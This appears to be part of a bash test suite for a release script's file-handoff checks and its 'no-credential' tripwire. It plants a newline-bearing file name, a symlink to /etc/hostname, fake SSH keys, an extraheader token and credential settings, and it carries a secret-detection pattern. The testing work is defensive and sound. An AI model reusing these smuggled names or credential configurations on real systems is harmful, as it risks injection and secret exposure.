refused "an extra directory"
check "an extra directory: names it and what it holds" "$(contains "$err" 'does not ship: sub sub/x')"
handed_run newline-name 0.1.0 "printf x > \$'evil\nname'"
refused "an extra file whose name holds a newline"
check "an extra file whose name holds a newline: names it quoted" "$(contains "$err" "\$'evil\\\\nname'")"
handed_run symlink 0.1.0 "rm $a-linux-arm64.tar.gz && ln -s /etc/hostname $a-linux-arm64.tar.gz"
refused "an archive swapped for a symlink"
check "an archive swapped for a symlink: says it is not a regular file" \
  "$(contains "$err" "$a-linux-arm64.tar.gz in .* is not a regular file")"
check "an archive swapped for a symlink: does not call it missing" "$(is "$(contains "$err" 'lacks')" false)"
handed_run directory 0.1.0 "rm $a-linux-amd64.tar.gz && mkdir $a-linux-amd64.tar.gz"
refused "an archive replaced by a directory"
check "an archive replaced by a directory: says it is not a regular file" \
  "$(contains "$err" "$a-linux-amd64.tar.gz in .* is not a regular file")"

set +e
out=$("$release_push" handed envoy-infra-v 0.1.0 "$hd/no-such-dir" "$a-linux-amd64.tar.gz" 2>"$hd/no-dir.err")
rc=$?
set -e
err=$(<"$hd/no-dir.err")
refused "a directory that does not exist"
check "a directory that does not exist: names it" "$(contains "$err" 'no-such-dir is not a directory')"
mkdir "$hd/nested" && mkdir "$hd/nested/sub" && printf x > "$hd/nested/sub/x"
set +e
out=$("$release_push" handed envoy-infra-v 0.1.0 "$hd/nested" sub/x 2>"$hd/nested.err")
rc=$?
set -e
err=$(<"$hd/nested.err")
refused "a file named with a /"
check "a file named with a /: says each file is a name in the directory" "$(contains "$err" 'sub/x is not a file name')"
set +e
out=$("$release_push" handed envoy-infra-v 0.1.0 "$hd/real" 2>"$hd/no-files.err")
rc=$?
set -e
refused "no file to check"

echo
echo "Case: no-credential names a reachable credential and never shows it"
# Each case runs the tripwire from a clean clone under an environment of only PATH, a throwaway
# HOME and the hermetic git settings, plants one credential at a time and checks the output names
# it without showing its value (each value carries a marker the output must lack).
nc="$work/nc"
setup "$nc"
mkdir "$nc/home"
# no_credential [VAR=value...]: runs `release-push.sh no-credential` in clone a; leaves its exit
# code in rc and its combined output in out.
no_credential() {
  set +e
  out=$(cd "$nc/a" && env -i PATH="$PATH" HOME="$nc/home" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 \
    "$@" bash "$release_push" no-credential 2>&1)
  rc=$?
  set -e
}
# lacks <marker>: true when the output never shows <marker>, for check.
lacks() { is "$(contains "$out" "$1")" false; }
clean='git config entries matching credential|insteadof|sshcommand|extraheader (names only):
  none
~/.ssh:
  absent
GIT_SSH_COMMAND: unset
SSH_AUTH_SOCK: unset
DEPLOY_KEY: unset
ACTIONS_ID_TOKEN_REQUEST_URL: unset
ACTIONS_ID_TOKEN_REQUEST_TOKEN: unset
no credential reachable'
no_credential
check "a clean job: exits 0" "$(is "$rc" 0)"
check "a clean job: prints none, absent, the five variables unset and no credential reachable" "$(is "$out" "$clean")"
no_credential GIT_SSH_COMMAND=ssh-marker-7f3a
check "GIT_SSH_COMMAND set: exits 1, naming it" \
  "$(is "$rc|$(contains "$out" '^GIT_SSH_COMMAND: set$')|$(contains "$out" '^::error::GIT_SSH_COMMAND is set$')" '1|true|true')"
check "GIT_SSH_COMMAND set: never shows the value" "$(lacks ssh-marker-7f3a)"
check "GIT_SSH_COMMAND set: does not call the job clean" "$(lacks 'no credential reachable')"
no_credential ACTIONS_ID_TOKEN_REQUEST_TOKEN=secret-value-2b7d
check "the OIDC token set: exits 1, naming it" "$(is "$rc|$(contains "$out" '^ACTIONS_ID_TOKEN_REQUEST_TOKEN: set$')" '1|true')"
check "the OIDC token set: never shows the value" "$(lacks secret-value-2b7d)"
no_credential DEPLOY_KEY=keymarker-4e
check "DEPLOY_KEY set: exits 1, naming it" "$(is "$rc|$(contains "$out" '^DEPLOY_KEY: set$')" '1|true')"
check "DEPLOY_KEY set: never shows the value" "$(lacks keymarker-4e)"
git -C "$nc/a" config core.sshCommand 'ssh -i /secret/marker-9c1e'
no_credential
check "core.sshCommand in the clone: exits 1, naming the entry" "$(is "$rc|$(contains "$out" '^  file:.*core\.sshcommand$')" '1|true')"
check "core.sshCommand in the clone: never shows the value" "$(lacks marker-9c1e)"
check "core.sshCommand in the clone: says git holds it" "$(contains "$out" '^::error::git holds credential or SSH configuration$')"
git -C "$nc/a" config --unset core.sshCommand
git -C "$nc/a" config url.git@github.com:.insteadOf https://github.com/
no_credential
check "url.*.insteadOf in the clone: exits 1, naming the entry" "$(is "$rc|$(contains "$out" '^  file:.*url\.git@github\.com:\.insteadof$')" '1|true')"
git -C "$nc/a" config http.https://github.com/.extraheader 'AUTHORIZATION: basic dG9rZW4tbWFya2VyLTZkMQ=='
no_credential
check "http.*.extraheader beside it: exits 1, each entry on its own indented line" \
  "$(is "$rc|$(printf '%s\n' "$out" | grep -c '^  file:')|$(contains "$out" '^  file:.*http\.https://github\.com/\.extraheader$')" '1|2|true')"
check "http.*.extraheader beside it: never shows the header" "$(lacks dG9rZW4)"
git -C "$nc/a" config --unset url.git@github.com:.insteadOf
git -C "$nc/a" config --unset http.https://github.com/.extraheader
git -C "$nc/a" config credential.helper store
no_credential
check "credential.helper in the clone: exits 1, naming the entry" "$(is "$rc|$(contains "$out" '^  file:.*credential\.helper$')" '1|true')"
git -C "$nc/a" config --unset credential.helper
mkdir "$nc/home/.ssh"
printf 'not a key\n' > "$nc/home/.ssh/id_ed25519"
no_credential
check "id_ed25519 in ~/.ssh: exits 1, listing it and naming the directory" \
  "$(is "$rc|$(contains "$out" ' id_ed25519$')|$(contains "$out" '^::error::~/\.ssh holds entries other than known_hosts$')" '1|true|true')"
rm "$nc/home/.ssh/id_ed25519"
: > "$nc/home/.ssh/known_hosts"
no_credential
check "known_hosts alone in ~/.ssh: exits 0, clean" "$(is "$rc|$(contains "$out" '^no credential reachable$')" '0|true')"
rm -r "$nc/home/.ssh"
mkdir "$nc/elsewhere" && printf 'not a key\n' > "$nc/elsewhere/id_rsa" && ln -s "$nc/elsewhere" "$nc/home/.ssh"
no_credential
check "a symlinked .ssh directory holding a key: exits 1, following it" \
  "$(is "$rc|$(contains "$out" ' id_rsa$')|$(contains "$out" '^::error::~/\.ssh holds entries other than known_hosts$')" '1|true|true')"
rm "$nc/home/.ssh"
printf 'not a directory\n' > "$nc/home/.ssh"
no_credential
check "a regular file at .ssh: exits 1, refusing it" "$(is "$rc|$(contains "$out" '^::error::~/\.ssh is not a directory$')" '1|true')"
rm "$nc/home/.ssh"
printf 'not a config [\n' > "$nc/bad.gitconfig"
no_credential GIT_CONFIG_GLOBAL="$nc/bad.gitconfig"
check "an unreadable git configuration: exits 1, naming git config's exit code" \
  "$(is "$rc|$(contains "$out" '^::error::git config --get-regexp exited 128, so the git configuration could not be read$')" '1|true')"

summary "release-push.sh version, push-main, tagged, tag, release, push-tag, handed and no-credential"

